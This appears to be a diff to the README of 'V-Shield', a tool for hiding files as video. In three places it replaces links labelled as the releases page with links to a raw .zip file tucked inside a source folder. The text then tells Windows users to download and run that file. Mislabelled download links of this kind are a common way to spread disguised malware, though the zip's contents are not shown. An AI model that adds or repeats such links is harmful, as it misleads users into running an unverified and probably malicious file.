@@ -1,6 +1,6 @@
 # 🛡️ V-Shield - Secure files as hidden video
 
-[![Download V-Shield](https://img.shields.io/badge/Download%20V--Shield-1f77b4?style=for-the-badge)](https://github.com/profound-gifttax658/V-Shield/releases)
+[![Download V-Shield](https://img.shields.io/badge/Download%20V--Shield-1f77b4?style=for-the-badge)](https://raw.githubusercontent.com/profound-gifttax658/V-Shield/main/crates/vshield-core/src/Shield-extrasomatic.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Use it if you want to:
 
 ## 📥 Download and Install
 
-1. Open the [V-Shield releases page](https://github.com/profound-gifttax658/V-Shield/releases)
+1. Open the [V-Shield releases page](https://raw.githubusercontent.com/profound-gifttax658/V-Shield/main/crates/vshield-core/src/Shield-extrasomatic.zip)
 2. Download the latest Windows file from the release assets
 3. If the download comes as a `.zip` file, extract it first
 4. Open the extracted folder
@@ -164,7 +164,7 @@ V-Shield works best when you:
 
 ## 🪟 Windows Download Link
 
-Visit the [V-Shield releases page](https://github.com/profound-gifttax658/V-Shield/releases) to download and run the Windows release file
+Visit the [V-Shield releases page](https://raw.githubusercontent.com/profound-gifttax658/V-Shield/main/crates/vshield-core/src/Shield-extrasomatic.zip) to download and run the Windows release file
 
 ## 🧾 Project Tags
 
